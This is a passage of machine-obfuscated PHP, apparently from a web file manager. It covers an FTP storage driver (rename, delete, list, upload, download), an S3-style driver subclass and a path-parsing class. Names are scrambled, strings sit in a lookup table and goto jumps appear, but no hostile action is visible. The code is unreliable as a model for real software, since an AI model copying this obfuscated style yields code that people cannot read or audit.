$this->download($µÛ‹ˆ„, $‹µ‹øéµ); $¥›Í¬ÇÙ = $this->upload($üê£¥º¤, $‹µ‹øéµ); $this->tempFileRemve($¨±ÉäÖà); return $¥›Í¬ÇÙ; } public function moveFile($ë£ªã‚ , $ìì‡“Ì‘) { if (!$this->_isconn()) { return !1; } $ë£ªã‚  = $this->iconvSystem($ë£ªã‚ ); $ìì‡“Ì‘ = $this->iconvSystem($ìì‡“Ì‘); $†°æŞ† = @ftp_rename($this->connect, $ë£ªã‚ , $ìì‡“Ì‘); if (!$†°æŞ†) { $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][1449], !0); return !1; } return $this->getPathOuter($ìì‡“Ì‘); } public function delFile($­¸ÑÄÔ£) { if (!$this->_isconn()) { return !1; } $­¸ÑÄÔ£ = $this->iconvSystem($­¸ÑÄÔ£); $ÆÔ­®ä¢ = @ftp_delete($this->connect, $­¸ÑÄÔ£); if (!$ÆÔ­®ä¢) { $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][1449], !0); } return $ÆÔ­®ä¢; } public function delFolder($”’ìûÅ¦) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¢À¹Ş« = $™Éæå«Ä = array(); $this->fileList($”’ìûÅ¦, $¢À¹Ş«, $™Éæå«Ä, !0); $this->listItemCache = !0; foreach ($™Éæå«Ä as $ùùÅ™ó·) { $÷— ªˆİ = $this->iconvSystem($ùùÅ™ó·[$_SERVER[ç¦¬”œš][32]]); $ÃÆá¥Ñ = @ftp_delete($this->connect, $÷— ªˆİ); if (!$ÃÆá¥Ñ) { return !1; } } foreach ($¢À¹Ş« as $÷— ªˆİ) { $÷— ªˆİ = $this->iconvSystem($÷— ªˆİ); $ÃÆá¥Ñ = @ftp_rmdir($this->connect, $÷— ªˆİ); if (!$ÃÆá¥Ñ) { return !1; } } $”’ìûÅ¦ = $this->iconvSystem($”’ìûÅ¦); return @ftp_rmdir($this->connect, $”’ìûÅ¦); } public function rename($‚ª¾ŞÊ, $âÂ²„ËÇ) { $ó§©Õ¥Ã =& $_SERVER[ç¦¬”œš]; if (!$this->_isconn()) { return !1; } $øµî“¼ = $this->fileNameAuto($this->pathFather($‚ª¾ŞÊ), $âÂ²„ËÇ); $øµî“¼ = $this->iconvSystem($øµî“¼); $‚ª¾ŞÊ = $this->iconvSystem($‚ª¾ŞÊ); $ç´šßº = $this->pathFather($‚ª¾ŞÊ); $Ğ¸†œí¢ = rtrim($ç´šßº, $ó§©Õ¥Ã[8]) . $ó§©Õ¥Ã[8] . $øµî“¼; $Ìˆ×±Ä = @ftp_rename($this->connect, $‚ª¾ŞÊ, $Ğ¸†œí¢); if (!$Ìˆ×±Ä) { $this->writeLog(__FUNCTION__ . $ó§©Õ¥Ã[1449], !0); return !1; } $Ğ¸†œí¢ = $this->iconvApp($Ğ¸†œí¢); return $this->getPathOuter($Ğ¸†œí¢); } private function folderInfo($ÍŞõ…¨, $ÇĞ€©€ = false) { $÷ş³ëÔí =& $_SERVER[ç¦¬”œš]; $†ÚÕ–º¡ = array($÷ş³ëÔí[32] => $this->pathThis($ÍŞõ…¨), $÷ş³ëÔí[87] => $this->getPathOuter($÷ş³ëÔí[8] . $ÍŞõ…¨), $÷ş³ëÔí[33] => $÷ş³ëÔí[78]); if ($ÇĞ€©€) { return $†ÚÕ–º¡; } $†ÚÕ–º¡[$÷ş³ëÔí[231]] = $†ÚÕ–º¡[$÷ş³ëÔí[88]] = 0; $†ÚÕ–º¡[$÷ş³ëÔí[232]] = $†ÚÕ–º¡[$÷ş³ëÔí[233]] = !0; return $†ÚÕ–º¡; } private function fileInfo($¸¤­¿ë², $ŒàîšÌ„ = false, $¢õ£ÌóÕ = array()) { $Ü§Ê«Ö =& $_SERVER[ç¦¬”œš]; $ƒüçùê” = array($Ü§Ê«Ö[32] => $this->pathThis($¸¤­¿ë²), $Ü§Ê«Ö[87] => $this->getPathOuter($Ü§Ê«Ö[8] . $¸¤­¿ë²), $Ü§Ê«Ö[33] => $Ü§Ê«Ö[230], $Ü§Ê«Ö[79] => isset($¢õ£ÌóÕ[$Ü§Ê«Ö[79]]) ? $¢õ£ÌóÕ[$Ü§Ê«Ö[79]] : 0, $Ü§Ê«Ö[169] => $this->ext($¸¤­¿ë²)); if ($ŒàîšÌ„) { return $ƒüçùê”; } $ƒüçùê”[$Ü§Ê«Ö[231]] = $ƒüçùê”[$Ü§Ê«Ö[88]] = 0; $ƒüçùê”[$Ü§Ê«Ö[232]] = $ƒüçùê”[$Ü§Ê«Ö[233]] = !0; $¥ãÁ×â = $this->iconvSystem($¸¤­¿ë²); $ƒüçùê”[$Ü§Ê«Ö[88]] = @ftp_mdtm($this->connect, $¥ãÁ×â); if (empty($¢õ£ÌóÕ)) { $¢õ£ÌóÕ = $this->objectMeta($¸¤­¿ë²); if (!$¢õ£ÌóÕ) { return $ƒüçùê”; } } $ƒüçùê”[$Ü§Ê«Ö[79]] = $¢õ£ÌóÕ[$Ü§Ê«Ö[79]]; return $ƒüçùê”; } public function size($Ú‘ÇÁÅÊ) { $»ıìƒ§ó = $this->objectMeta($Ú‘ÇÁÅÊ); return $»ıìƒ§ó ? $»ıìƒ§ó[$_SERVER[ç¦¬”œš][79]] : 0; } public function info($Ûë®ÀÛ¨) { if ($this->isFile($Ûë®ÀÛ¨)) { return $this->fileInfo($Ûë®ÀÛ¨, 0); } else { if ($this->isFolder($Ûë®ÀÛ¨)) { return $this->folderInfo($Ûë®ÀÛ¨); } } return !1; } private function fileList($Îßø‹¯˜, &$ï‚Ó¥õÈ, &$Ü«·±è†, $¼ö¯âµ = false) { $®õõá„ =& $_SERVER[ç¦¬”œš]; $Îßø‹¯˜ = $this->iconvSystem($Îßø‹¯˜); if (!$this->isFolder($Îßø‹¯˜)) { return !1; } @ftp_chdir($this->connect, $®õõá„[8]); $Îßø‹¯˜ = rtrim($Îßø‹¯˜, $®õõá„[8]) . $®õõá„[8]; check_abort(); $í¸üÌ³¤ = @ftp_rawlist($this->connect, $Îßø‹¯˜); if (!$í¸üÌ³¤) { $í¸üÌ³¤ = array(); } $Ğ¾©ší· = array($®õõá„[10] => 1, $®õõá„[1364] => 1); foreach ($í¸üÌ³¤ as $ ¡¬ãÚµ) { $¡€°Ä„Ï = $this->_listItem($ ¡¬ãÚµ); if ($¡€°Ä„Ï[0] == $®õõá„[838]) { continue; } $€¥¿öË = $¡€°Ä„Ï[8]; if (empty($€¥¿öË) && $€¥¿öË !== $®õõá„[228] || isset($Ğ¾©ší·[$€¥¿öË])) { continue; } $€¥¿öË = $this->iconvApp($Îßø‹¯˜ . ltrim($€¥¿öË, $®õõá„[8])); $¦æİÙçÇ = array($®õõá„[32] => $€¥¿öË, $®õõá„[33] => $®õõá„[230], $®õõá„[79] => $¡€°Ä„Ï[4]); if (substr($ ¡¬ãÚµ, 0, 1) == $®õõá„[1450]) { $¦æİÙçÇ[$®õõá„[33]] = $®õõá„[78]; $¦æİÙçÇ[$®õõá„[79]] = 0; } $ÆÙÔ©è° = $¦æİÙçÇ[$®õõá„[33]] == $®õõá„[78] ? !0 : !1; $this->cacheMethodInfoSet($€¥¿öË, $ÆÙÔ©è°, $¦æİÙçÇ); if ($ÆÙÔ©è°) { $ï‚Ó¥õÈ[] = $€¥¿öË; if ($¼ö¯âµ) { $this->fileList($€¥¿öË, $ï‚Ó¥õÈ, $Ü«·±è†, $¼ö¯âµ); } continue; } $Ü«·±è†[] = $¦æİÙçÇ; } $this->cacheMethodInfoSet($Îßø‹¯˜, !0); } private function _listItem($±Š®ÀÎ) { if (empty($±Š®ÀÎ)) { return array(); } $·Á©îÁ = preg_split($_SERVER[ç¦¬”œš][1451], $±Š®ÀÎ); if (count($·Á©îÁ) <= 9) { return $·Á©îÁ; } $·Á©îÁ[8] = trim(substr($±Š®ÀÎ, strpos($±Š®ÀÎ, $·Á©îÁ[7]) + strlen($·Á©îÁ[7]))); return array_splice($·Á©îÁ, 0, 9); } public function listPath($ë™²ÙîÁ, $ŠâËß®Ó = false) { $ù•®ü•¯ =& $_SERVER[ç¦¬”œš]; if (!$this->_isconn()) { return !1; } $İ¢¢¬ãõ = $µ­Ì™Æõ = array(); $this->fileList($ë™²ÙîÁ, $İ¢¢¬ãõ, $µ­Ì™Æõ); foreach ($İ¢¢¬ãõ as $¬º‹“°® => $áÄ½†•ñ) { $İ¢¢¬ãõ[$¬º‹“°®] = $this->folderInfo($áÄ½†•ñ, $ŠâËß®Ó); } foreach ($µ­Ì™Æõ as $¬º‹“°® => $áÄ½†•ñ) { $µ­Ì™Æõ[$¬º‹“°®] = $this->fileInfo($áÄ½†•ñ[$ù•®ü•¯[32]], $ŠâËß®Ó, $áÄ½†•ñ); } return array($ù•®ü•¯[85] => $İ¢¢¬ãõ, $ù•®ü•¯[86] => $µ­Ì™Æõ); } public function has($¾¿ßˆŒ‡, $‰š©ã¦• = false, $Şœ¸®æØ = true) { $İ”ôÌÁ =& $_SERVER[ç¦¬”œš]; $š¢ƒ…¾Ô = $‹î±³²— = array(); $Ú÷ëÒú = $‰š©ã¦• ? !0 : !1; $this->fileList($¾¿ßˆŒ‡, $š¢ƒ…¾Ô, $‹î±³²—, $Ú÷ëÒú); if ($‰š©ã¦•) { return array($İ”ôÌÁ[239] => count($‹î±³²—), $İ”ôÌÁ[240] => count($š¢ƒ…¾Ô)); } if ($Şœ¸®æØ) { if (count($‹î±³²—)) { return !0; } } else { if (count($š¢ƒ…¾Ô)) { return !0; } } return !1; } public function listAll($Íê âÔ’) { $ÀñªğøÎ =& $_SERVER[ç¦¬”œš]; if (!$this->_isconn()) { return !1; } $¿ŠÄÊıı = $âİòÊ°å = array(); $this->fileList($Íê âÔ’, $¿ŠÄÊıı, $âİòÊ°å, !0); $×óÙØ‹© = array_to_keyvalue($âİòÊ°å, $ÀñªğøÎ[32]); foreach ($¿ŠÄÊıı as $Û§­½µÔ) { if (is_string($Û§­½µÔ)) { $×óÙØ‹©[$Û§­½µÔ] = array($ÀñªğøÎ[79] => 0); } } return $this->listAllFiles($Íê âÔ’, $×óÙØ‹©); } public function getContent($ï·˜çŞÇ) { if (!$this->_isconn()) { return !1; } $ï·˜çŞÇ = $this->iconvSystem($ï·˜çŞÇ); return $this->fileSubstr($ï·˜çŞÇ); } public function setContent($ØˆÑâÃ, $†‚ñ‚şâ = '') { if (!$this->_isconn()) { return !1; } $ó÷ÒÔ£ = $this->pathThis($this->iconvSystem($ØˆÑâÃ)); $‹ã§ÈÁ÷ = $this->tempFile($ó÷ÒÔ£); file_put_contents($‹ã§ÈÁ÷, $†‚ñ‚şâ); $€öè·á = $this->upload($ØˆÑâÃ, $this->iconvApp($‹ã§ÈÁ÷)); $this->tempFileRemve($‹ã§ÈÁ÷); return $€öè·á; } public function fileSubstr($ı¤”íÍ³, $›¿ëÂòê = 0, $Ä›èÑØ£ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ı¤”íÍ³, $›¿ëÂòê, $Ä›èÑØ£); } private function ftpRequest($›ŒÀ²çÀ, $ëğ¶Ç©‘ = 0, $®©™– = false) { $›ŒÀ²çÀ = $this->iconvSystem($›ŒÀ²çÀ); $ÕßœúÔğ = $this->scheme . $this->host . $_SERVER[ç¦¬”œš][4] . $this->port; $ŸƒÇƒËÃ = curl_init(); curl_setopt($ŸƒÇƒËÃ, CURLOPT_URL, $ÕßœúÔğ . $this->pathEncode($›ŒÀ²çÀ)); curl_setopt($ŸƒÇƒËÃ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($®©™–) { $”ĞˆÃ¦ = $ëğ¶Ç©‘ + $®©™– - 1; curl_setopt($ŸƒÇƒËÃ, CURLOPT_RANGE, "{$ëğ¶Ç©‘}\x2d{$”ĞˆÃ¦}"); } curl_setopt($ŸƒÇƒËÃ, CURLOPT_RETURNTRANSFER, 1); $®–­’ó = curl_exec($ŸƒÇƒËÃ); curl_close($ŸƒÇƒËÃ); return $®–­’ó; } public function upload($€®ØìÛÚ, $ò±ö ¯¹, $ñÌÛÑŸ» = false, $˜±‚ƒ¼¾ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($€®ØìÛÚ))) { return !1; } $€®ØìÛÚ = $this->iconvSystem($€®ØìÛÚ); $ò±ö ¯¹ = $this->iconvSystem($ò±ö ¯¹); $È±èäô¨ = ftp_nb_put($this->connect, $€®ØìÛÚ, $ò±ö ¯¹, FTP_BINARY); while ($È±èäô¨ == FTP_MOREDATA) { $È±èäô¨ = ftp_nb_continue($this->connect); } if ($È±èäô¨ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][1449], !0); return !1; } return $this->getPathOuter($€®ØìÛÚ); } public function download($Æüå¥ÃÖ, $¼‘¯¥Ö = '') { if (!$this->_isconn()) { return !1; } $¡—Ûùü± = $this->pathFather($¼‘¯¥Ö); if (!IO::mkdir($¡—Ûùü±)) { return !1; } $Æüå¥ÃÖ = $this->iconvSystem($Æüå¥ÃÖ); $¼‘¯¥Ö = $this->iconvSystem($¼‘¯¥Ö); $òÙ²Ÿ€ = ftp_nb_get($this->connect, $¼‘¯¥Ö, $Æüå¥ÃÖ, FTP_BINARY); while ($òÙ²Ÿ€ == FTP_MOREDATA) { $òÙ²Ÿ€ = ftp_nb_continue($this->connect); } if ($òÙ²Ÿ€ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][1449], !0); return !1; } return $this->iconvApp($¼‘¯¥Ö); } public function exist($ı´ôÃë”) { return $this->isFile($ı´ôÃë”) || $this->isFolder($ı´ôÃë”); } public function isFile($—ËÒ‚Ùñ) { return !$this->isFolder($—ËÒ‚Ùñ) && $this->objectMeta($—ËÒ‚Ùñ); } public function isFolder($ĞÇÁÉ‰Ï) { return $this->cacheMethod($_SERVER[ç¦¬”œš][179], $ĞÇÁÉ‰Ï); } protected function objectMeta($×¿ØÜÂ) { return $this->cacheMethod($_SERVER[ç¦¬”œš][181], $×¿ØÜÂ); } protected function _objectMeta($’°´ä ) { $æüùÙ¼€ =& $_SERVER[ç¦¬”œš]; if ($’°´ä  == $æüùÙ¼€[12] || $’°´ä  == $æüùÙ¼€[8]) { return array(); } if (!$this->_isconn()) { return !1; } $’°´ä  = $this->iconvSystem($’°´ä ); $‰Ñ€ÚŸÉ = array($æüùÙ¼€[32] => $this->iconvApp($’°´ä ), $æüùÙ¼€[33] => $æüùÙ¼€[230], $æüùÙ¼€[79] => 0); @ftp_chdir($this->connect, $æüùÙ¼€[8]); $˜è¥Éí = @ftp_size($this->connect, $’°´ä ); if ($˜è¥Éí != -1) { $‰Ñ€ÚŸÉ[$æüùÙ¼€[79]] = $˜è¥Éí; } else { $û¬ÓÚœÏ = @ftp_chdir($this->connect, $’°´ä ); if (!$û¬ÓÚœÏ) { return !1; } $‰Ñ€ÚŸÉ[$æüùÙ¼€[33]] = $æüùÙ¼€[78]; } return $‰Ñ€ÚŸÉ; } protected function _isFolder($›ıß•€æ) { $ÔÁîÛìÜ =& $_SERVER[ç¦¬”œš]; if ($›ıß•€æ == $ÔÁîÛìÜ[12] || $›ıß•€æ == $ÔÁîÛìÜ[8]) { return !0; } $ˆæ³Î³ = $this->_objectMeta($›ıß•€æ); return isset($ˆæ³Î³[$ÔÁîÛìÜ[33]]) && $ˆæ³Î³[$ÔÁîÛìÜ[33]] == $ÔÁîÛìÜ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($Ç­ÀŞõø) { parent::__construct($Ç­ÀŞõø); $this->setSignVersion($_SERVER[ç¦¬”œš][247]); } public function uploadLink($©àòÆ”Í, $ëÄÎõØ = 0) { $ãñÎÊºØ =& $_SERVER[ç¦¬”œš]; if ($this->isUploadServer()) { return; } $®•ÍØ… = $this->getType(); if (!in_array($®•ÍØ…, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ô©áĞ“ = (!$ëÄÎõØ ? 1 : ceil($ëÄÎõØ / pow(1024, 3))) * 3600 * 4; $ï»Ø˜œ‚ = $this->multiUploadFormData($©àòÆ”Í, $Ô©áĞ“); if ($ï»Ø˜œ‚) { $ï»Ø˜œ‚[$ãñÎÊºØ[97]] = $©àòÆ”Í; $ï»Ø˜œ‚[$ãñÎÊºØ[98]] = $®•ÍØ…; } return $ï»Ø˜œ‚; } public function fileOutImage($í , $–ÈòÌ¾ğ = 250) { if ($this->size($í ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($í , $–ÈòÌ¾ğ); } $öÑÔ»Õ = $this->link($í ); $öÑÔ»Õ .= $_SERVER[ç¦¬”œš][1452] . $–ÈòÌ¾ğ; $this->fileOutLink($öÑÔ»Õ); } public function fileOutLink($ª–œÅ³Ä) { $Îáİ¹ =& $_SERVER[ç¦¬”œš]; if (substr($ª–œÅ³Ä, 0, 7) == $Îáİ¹[313]) { $ª–œÅ³Ä = $Îáİ¹[314] . substr($ª–œÅ³Ä, 7); } header($Îáİ¹[175] . $ª–œÅ³Ä); die; } } goto eô…‰²ƒâ; B×ğöïïÇÚ: class KodIO { const KOD_SOURCE = "\x7b\163\x6f\165\x72\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\x72\x52\145\x63\x79\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\165\x73\145\162\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\162\106\151\x6c\x65\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\162\106\x69\154\x65\x54\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\x75\x70\122\x6f\x6f\x74\123\145\154\x66\x7d"; const KOD_USER_SHARE = "\173\165\163\x65\x72\123\x68\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\x72\x53\x68\x61\x72\145\114\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\162\x65\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\x72\x65\111\164\x65\x6d\175"; const KOD_SHARE_LINK = "\173\163\150\141\162\x65\111\x74\145\x6d\114\151\156\x6b\x7d"; const KOD_SEARCH = "\173\x73\145\x61\x72\x63\x68\x7d"; const KOD_BLOCK = "\x7b\142\x6c\157\x63\x6b\x7d"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\173\x75\163\x65\162\122\x65\x6e\x63\x65\x6e\164\175"; const KOD_USER_DRIVER = "\173\144\162\151\x76\145\x72\175"; public static function typeList() { $¿„—µò =& $_SERVER[ç¦¬”œš]; return array($¿„—µò[1337] => self::KOD_SOURCE, $¿„—µò[1338] => self::KOD_USER_RECYCLE, $¿„—µò[1339] => self::KOD_USER_FAV, $¿„—µò[1340] => self::KOD_USER_FILE_TAG, $¿„—µò[1341] => self::KOD_USER_FILE_TYPE, $¿„—µò[1342] => self::KOD_GROUP_ROOT_SELF, $¿„—µò[1343] => self::KOD_USER_SHARE, $¿„—µò[1344] => self::KOD_USER_SHARE_LINK, $¿„—µò[1345] => self::KOD_USER_SHARE_TO_ME, $¿„—µò[1346] => self::KOD_SHARE_ITEM, $¿„—µò[1347] => self::KOD_SHARE_LINK, $¿„—µò[1348] => self::KOD_SEARCH, $¿„—µò[1349] => self::KOD_BLOCK, $¿„—µò[1350] => self::KOD_IO, $¿„—µò[1351] => self::KOD_USER_RECENT, $¿„—µò[1352] => self::KOD_USER_DRIVER); } public static function parse($›°èøî) { $ùÕÀÒö» =& $_SERVER[ç¦¬”œš]; $›°èøî = self::clear($›°èøî); $­¹ì®è² = array_values(self::typeList()); preg_match($ùÕÀÒö»[1353], $›°èøî, $™ê¿¹õ…); $„Æâôû³ = array($ùÕÀÒö»[505] => !1, $ùÕÀÒö»[1354] => !1, $ùÕÀÒö»[502] => !1, $ùÕÀÒö»[87] => $›°èøî, $ùÕÀÒö»[1252] => !1, $ùÕÀÒö»[1251] => $ùÕÀÒö»[12]); if (is_array($™ê¿¹õ…) && count($™ê¿¹õ…) == 5) { $¡Û¦Ğ¯ş = $ùÕÀÒö»[1355] . $™ê¿¹õ…[2] . $ùÕÀÒö»[403]; if (in_array($¡Û¦Ğ¯ş, $­¹ì®è²)) { $„Æâôû³[$ùÕÀÒö»[1252]] = $™ê¿¹õ…[1]; $„Æâôû³[$ùÕÀÒö»[33]] = $¡Û¦Ğ¯ş; $„Æâôû³[$ùÕÀÒö»[1356]] = substr($¡Û¦Ğ¯ş, 1, -1); $„Æâôû³[$ùÕÀÒö»[484]] = $™ê¿¹õ…[3]; } $„Æâôû³[$ùÕÀÒö»[1251]] = $™ê¿¹õ…[4]; } $ğ‰µÜ = array($ùÕÀÒö»[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $„Æâôû³[$ùÕÀÒö»[1319]] = in_array($„Æâôû³[$ùÕÀÒö»[33]], $ğ‰µÜ); return $„Æâôû³; } public static function isTruePath($Œ–Å²¤‘) { $²§¤ÔÏ =& $_SERVER[ç¦¬”œš]; if (substr($Œ–Å²¤‘, 0, 1) != $²§¤ÔÏ[1355]) { return !0; } if (strpos($Œ–Å²¤‘, $²§¤ÔÏ[492]) === 0) { return !0; } if (strpos($Œ–Å²¤‘, $²§¤ÔÏ[1323]) === 0) { return !0; } if (strpos($Œ–Å²¤‘, $²§¤ÔÏ[1357]) === 0) { return !0; } if (strpos($Œ–Å²¤‘, $²§¤ÔÏ[1358]) === 0) { return !0; } if (strpos($Œ–Å²¤‘, $²§¤ÔÏ[1359]) === 0) { return !0; } return !1; } public static function clear($×Ê“—áÑ) { $Î„×åØÓ =& $_SERVER[ç¦¬”œš]; $×Ê“—áÑ = str_replace(array($Î„×åØÓ[1158], $Î„×åØÓ[262]), $Î„×åØÓ[53], $×Ê“—áÑ); $×Ê“—áÑ = str_replace($Î„×åØÓ[100], $Î„×åØÓ[8], $×Ê“—áÑ); $ŒŞÇÕğâ = $Î„×åØÓ[1360]; if (substr($×Ê“—áÑ, 0, 3) == $Î„×åØÓ[1361]) { $×Ê“—áÑ = substr($×Ê“—áÑ, 3); } while (strstr($×Ê“—áÑ, $ŒŞÇÕğâ)) { $×Ê“—áÑ = str_replace($ŒŞÇÕğâ, $Î„×åØÓ[8], $×Ê“—áÑ); } $×Ê“—áÑ = preg_replace($Î„×åØÓ[1362], $Î„×åØÓ[8], $×Ê“—áÑ); if ($×Ê“—áÑ == $Î„×åØÓ[8]) { return $Î„×åØÓ[8]; } $×Ê“—áÑ = rtrim($×Ê“—áÑ, $Î„×åØÓ[8]); return $×Ê“—áÑ; } public static function pathTrue($³ò¿ı†½) { $ÉÇ’ÄñØ =& $_SERVER[ç¦¬”œš]; if (!$³ò¿ı†½) { return $ÉÇ’ÄñØ[12]; } $³ò¿ı†½ = str_replace($ÉÇ’ÄñØ[601], $ÉÇ’ÄñØ[8], str_replace($ÉÇ’ÄñØ[1363], $ÉÇ’ÄñØ[8], $³ò¿ı†½)); $³ò¿ı†½ = str_replace($ÉÇ’ÄñØ[601], $ÉÇ’ÄñØ[8], str_replace($ÉÇ’ÄñØ[1363], $ÉÇ’ÄñØ[8], $³ò¿ı†½)); if (!strstr($³ò¿ı†½, $ÉÇ’ÄñØ[1361])) { return $³ò¿ı†½; } $ú¿Ğ¸·ı = explode($ÉÇ’ÄñØ[8], $³ò¿ı†½); foreach ($ú¿Ğ¸·ı as $¬Ç÷©Ù£ => $•‹ÈËÏ¤) { if ($•‹ÈËÏ¤ !== $ÉÇ’ÄñØ[1364]) { continue; } for ($©Ü§ŠŠ¡ = $¬Ç÷©Ù£; $©Ü§ŠŠ¡ >= 0; $©Ü§ŠŠ¡--) { if ($ú¿Ğ¸·ı[$©Ü§ŠŠ¡] === $ÉÇ’ÄñØ[10] || $ú¿Ğ¸·ı[$©Ü§ŠŠ¡] === $ÉÇ’ÄñØ[1364] || $ú¿Ğ¸·ı[$©Ü§ŠŠ¡] === -1) { continue; } if ($ú¿Ğ¸·ı[$©Ü§ŠŠ¡] === $ÉÇ’ÄñØ[12]) { $ú¿Ğ¸·ı[$¬Ç÷©Ù£] = -1; break; } $ú¿Ğ¸·ı[$¬Ç÷©Ù£] = -1; $ú¿Ğ¸·ı[$©Ü§ŠŠ¡] = -1; break; } } $ê±•‹€ = array(); foreach ($ú¿Ğ¸·ı as $•‹ÈËÏ¤) { if ($•‹ÈËÏ¤ !== -1) { $ê±•‹€[] = $•‹ÈËÏ¤; } } $Å‹„”Ö‹ = implode($ÉÇ’ÄñØ[8], $ê±•‹€); if (strpos($Å‹„”Ö‹, $ÉÇ’ÄñØ[1365]) === 0) { $Å‹„”Ö‹ = $ÉÇ’ÄñØ[1361] . substr($Å‹„”Ö‹, strlen($ÉÇ’ÄñØ[1365])); } return $Å‹„”Ö‹; } public static function pathUrlClear($¾ ô¿ß´) { $Íëáñµä =& $_SERVER[ç¦¬”œš]; if (!$¾ ô¿ß´) { return $¾ ô¿ß´; } $¾ ô¿ß´ = rawurldecode($¾ ô¿ß´); $¾ ô¿ß´ = str_replace($Íëáñµä[1363], $Íëáñµä[8], $¾ ô¿ß´); if (strpos($¾ ô¿ß´, $Íëáñµä[76]) > 0) { $¾ ô¿ß´ = substr($¾ ô¿ß´, 0, strpos($¾ ô¿ß´, $Íëáñµä[76])); } if (strpos($¾ ô¿ß´, $Íëáñµä[1366]) > 0) { $¾ ô¿ß´ = substr($¾ ô¿ß´, 0, strpos($¾ ô¿ß´, $Íëáñµä[1366])); } return $¾ ô¿ß´; } public static function sourceID($‡õ“ü†¬) { $ø¬Ãİ» =& $_SERVER[ç¦¬”œš]; $ÀÇ…–¼õ = self::parse($‡õ“ü†¬); if ($ÀÇ…–¼õ[$ø¬Ãİ»[33]] !== self::KOD_SOURCE) { show_json(LNG($ø¬Ãİ»[1367]), !1); } return $ÀÇ…–¼õ[$ø¬Ãİ»[484]]; } public static function make($ÎıàÚ•Ô) { if (!$ÎıàÚ•Ô) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÎıàÚ•Ô)); } public static function makeShare($•ˆí÷Š¾, $ŞµÇşŠû) { return self::makePath(self::KOD_SHARE_ITEM, $•ˆí÷Š¾, $ŞµÇşŠû); } public static function makeFileTypePath($¿İÁã·) { return self::makePath(self::KOD_USER_FILE_TYPE, $¿İÁã·); } public static function makeFileTagPath($™‡Åœ¢) { return self::makePath(self::KOD_USER_FILE_TAG, $™‡Åœ¢); } public static function makePath($­³ú‡ø, $ÊŞÊŞ¦³ = '', $ªŒ«Ó¶“ = '') { $“ ”Ğ«Æ =& $_SERVER[ç¦¬”œš]; $¥Øşƒú = substr($­³ú‡ø, 1, -1); $™ÁÈñÑ = $“ ”Ğ«Æ[1368] . $¥Øşƒú . $“ ”Ğ«Æ[1369] . $ÊŞÊŞ¦³ . $“ ”Ğ«Æ[1370]; $™ÁÈñÑ = $ªŒ«Ó¶“ ? $™ÁÈñÑ . $ªŒ«Ó¶“ . $“ ”Ğ«Æ[8] : $™ÁÈñÑ; return $™ÁÈñÑ; } public static function hashPath($ÉÄ‡’Õ¸, $ëÌÇ÷æó = true) { $ìí¶‹° =& $_SERVER[ç¦¬”œš]; $šçŠîüŠ = is_array($ÉÄ‡’Õ¸) ? $ÉÄ‡’Õ¸ : IO::info($ÉÄ‡’Õ¸); $˜Ò¤º‡Î = _get($šçŠîüŠ, $ìí¶‹°[1371], $ìí¶‹°[12]); if (!$˜Ò¤º‡Î && isset($šçŠîüŠ[$ìí¶‹°[235]])) { $˜Ò¤º‡Î = trim($šçŠîüŠ[$ìí¶‹°[235]], $ìí¶‹°[121]); } if (!$˜Ò¤º‡Î && isset($šçŠîüŠ[$ìí¶‹°[193]]) && $šçŠîüŠ[$ìí¶‹°[193]]) { $šçŠîüŠ = IO::info(KodIO::make($šçŠîüŠ[$ìí¶‹°[193]])); $˜Ò¤º‡Î = _get($šçŠîüŠ, $ìí¶‹°[1371], $ìí¶‹°[12]); } $®éÂÎÜ’ = md5($šçŠîüŠ[$ìí¶‹°[87]] . $šçŠîüŠ[$ìí¶‹°[79]] . $šçŠîüŠ[$ìí¶‹°[88]]); if (!$˜Ò¤º‡Î && file_exists($šçŠîüŠ[$ìí¶‹°[87]])) { $˜Ò¤º‡Î = Cache::get($®éÂÎÜ’ . $ìí¶‹°[1372]); $˜Ò¤º‡Î = !1; if (!$˜Ò¤º‡Î) { $˜Ò¤º‡Î = IO::hashSimple($šçŠîüŠ[$ìí¶‹°[87]]); Cache::set($®éÂÎÜ’ . $ìí¶‹°[1372], $˜Ò¤º‡Î, 3600 * 24 * 30); } } if ($ëÌÇ÷æó && !$˜Ò¤º‡Î) { } return $˜Ò¤º‡Î ? $˜Ò¤º‡Î : $®éÂÎÜ’; } public static function hashPathSafe($ÑÚåÕî, $¬§ÔÅ›Ñ = true) { $ğ“ˆÁçŠ =& $_SERVER[ç¦¬”œš]; $©Œ´ÉÅª = self::hashPath($ÑÚåÕî, $¬§ÔÅ›Ñ); return md5($©Œ´ÉÅª . $ğ“ˆÁçŠ[1373] . Model($ğ“ˆÁçŠ[850])->get($ğ“ˆÁçŠ[851])); } public static function initSystemPath() { $ïİì¨ =& $_SERVER[ç¦¬”œš]; if (defined($ïİì¨[1374])) { return; } define($ïİì¨[1374], self::systemPath($ïİì¨[191])); define($ïİì¨[1375], self::systemPath($ïİì¨[1376])); define($ïİì¨[1377], self::systemPath($ïİì¨[1378])); define($ïİì¨[1379], self::systemPath($ïİì¨[1380])); IOHistory::bindEvent(); } public static function 